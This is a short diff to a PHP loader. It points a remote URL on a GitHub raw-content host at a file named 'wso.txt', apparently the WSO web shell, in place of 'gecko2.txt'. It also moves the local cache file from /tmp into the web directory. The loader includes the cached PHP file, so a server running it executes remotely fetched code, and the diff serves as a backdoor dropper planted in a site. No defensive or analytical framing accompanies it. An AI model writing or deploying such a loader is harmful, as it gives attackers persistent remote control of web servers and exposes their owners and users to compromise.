@@ -1,5 +1,5 @@
 <?php
-$data = ['https://raw.githubusercontent.com/joannaarturo/JanganDiBuka/main/gecko2.txt', '/tmp/sesssz_'.md5($_SERVER['HTTP_HOST']).'.php'];
+$data = ['https://raw.githubusercontent.com/joannaarturo/JanganDiBuka/main/wso.txt', './sesssz_'.md5($_SERVER['HTTP_HOST']).'.php'];
 
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
